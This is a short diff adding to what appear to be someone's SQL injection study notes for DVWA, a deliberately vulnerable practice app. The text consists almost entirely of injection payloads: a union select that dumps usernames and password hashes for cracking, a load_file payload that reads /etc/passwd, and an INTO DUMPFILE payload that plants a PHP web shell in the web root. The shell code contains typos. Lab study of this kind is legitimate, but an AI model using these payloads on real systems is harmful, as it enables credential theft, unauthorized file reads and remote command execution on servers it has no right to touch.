@@ -150,3 +150,7 @@ Spli
 		# toe get the content of a table of a particular schema 
 			1' union select user,password from dvwa.users#
 			# crack station to find the collision of hash of the passwd
+		# load a file on the host
+			union select null,load_file('/etc/passwd')#
+		# write a sh on the host
+			union select null,:<?php $var=shell_ecec($GET['cmd']): echo $var ?> INTO DUMPFILE '/var/www/html/shell.php'#
